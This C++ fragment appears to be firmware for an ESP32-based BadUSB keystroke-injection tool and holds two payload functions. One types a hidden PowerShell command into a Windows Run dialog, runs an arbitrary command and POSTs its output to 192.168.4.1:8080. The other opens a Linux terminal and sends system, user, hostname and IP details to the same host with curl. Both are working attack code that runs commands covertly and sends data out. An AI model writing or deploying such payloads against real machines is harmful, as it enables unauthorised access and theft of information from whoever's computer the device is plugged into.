// Custom command with output capture (Windows)
static void payload_win_custom_out() {
    static char customCmd[128] = "whoami";
    charPicker(customCmd, 127, "Win Cmd (Out)");
    badusb_ensure_init();
    dispBanner("Typing+Capture...", 600, BannerType::INFO);
    badusb_win_r();
    // Komutu çalıştır, çıktıyı ESP32'ye POST et
    badusb_type("powershell -NoP -NonI -W Hidden -C \"");
    badusb_type("$r=(");
    badusb_type(customCmd);
    badusb_type(" 2>&1|Out-String).Trim();");
    badusb_type("try{Invoke-WebRequest -Uri 'http://192.168.4.1:8080/out' -Method POST -Body $r -TimeoutSec 8}catch{}\"");
    badusb_enter();
    logPush("[BADUSB] Win Custom+Out: " + String(customCmd));
    dispBannerOK("Sent!");
    badusb_wait_output(30000);
}

// ─── Linux Output Payloads ────────────────────────────────

// Linux SysInfo → POST to ESP32 via curl
static void payload_linux_sysinfo_out() {
    badusb_ensure_init();
    dispBanner("Running+Capture...", 600, BannerType::INFO);
    badusb_ctrl_alt_t();
    delay(800);
    // uname, whoami, ip, os bilgisi topla ve curl ile POST et
    badusb_type_ln("bash -c 'R=\"OS:$(uname -sr) USER:$(whoami) HOST:$(hostname) IP:$(hostname -I|cut -d\" \" -f1) UPTIME:$(uptime -p 2>/dev/null||uptime)\"; curl -s -X POST http://192.168.4.1:8080/out -d \"$R\" &'");
    logPush("[BADUSB] Linux SysInfo+Out sent");
    dispBannerOK("Payload sent!");
    badusb_wait_output(20000);
}

